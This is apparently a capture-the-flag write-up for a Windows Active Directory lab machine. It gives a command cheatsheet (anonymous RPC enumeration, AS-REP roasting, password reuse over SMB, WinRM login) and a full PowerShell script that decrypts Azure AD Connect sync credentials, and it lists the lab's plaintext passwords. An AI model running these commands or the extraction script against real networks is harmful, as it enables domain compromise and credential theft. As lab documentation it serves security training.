# Monteverde \[Windows AD Medium]

## Report

With a userlist from rpcclient and no other leads, the user 'SABatchJobs' has the same username as well as password. Further SMB access reveals creds for user 'mhope'

This user is part of a role that performs Azure AD Sync, a google search provides the required script and parameters required for the SQL connection from Powershell. This outputs the username and password used by the Domain Controller

## Cheatsheet

```
rpcclient -U '' -N 10.10.10.172
queryusergroups 0x641
querygroup 0xa29

python3 GetNPUsers.py megabank.local/ -dc-ip 10.10.10.172 -usersfile ~/htb/rooms/monteverde/userlist.ldap

nxc smb 10.10.11.172 -u SABatchJobs -p SABatchJobs --shares
smbclient //10.10.10.172/users$ -U SABatchJobs
get azure.xml
evil-winrm -i megabank.local -u mhope -p 4n0therD4y@n0th3r$
whoami /priv /groups
systeminfo
./SharpHound.exe
cd "Program Files"
C:\Program Files\Microsoft SQL Server\110\Tools\Binn> .\SQLCMD.exe -q "select name from sys.databases;"
```

```
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
#$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)

```

## Loot

### Creds

Same username used as password

SABatchJobs:SABatchJobs

mhope:4n0therD4y@n0th3r$

### Proof

{% embed url="https://blog.xpnsec.com/azuread-connect-for-redteam/" %}

{% embed url="https://www.hackingarticles.in/active-directory-enumeration-rpcclient/" %}
